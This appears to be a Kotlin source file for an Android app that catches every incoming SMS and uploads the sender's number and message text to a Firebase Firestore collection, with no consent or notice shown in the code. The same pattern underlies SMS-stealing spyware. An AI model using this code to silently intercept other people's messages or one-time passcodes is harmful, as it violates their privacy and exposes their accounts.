package com.example.getsms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.google.firebase.Firebase
import com.google.firebase.firestore.firestore

class SmsReceiver : BroadcastReceiver() {

    val db = Firebase.firestore

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            for (message in messages) {
                val sender = message.originatingAddress
                val messageBody = message.messageBody

                // Log the received SMS
                logMessage("Received SMS from $sender: $messageBody")
            }
        }
    }

    private fun logMessage(message: String) {
        Log.d("SmsReceiverLog", message)

        val MSG = hashMapOf(

            "message" to message

        )

        Log.d("SmsReceiverLog", MSG.toString())
        db.collection("messages")
            .add(MSG)

    }
}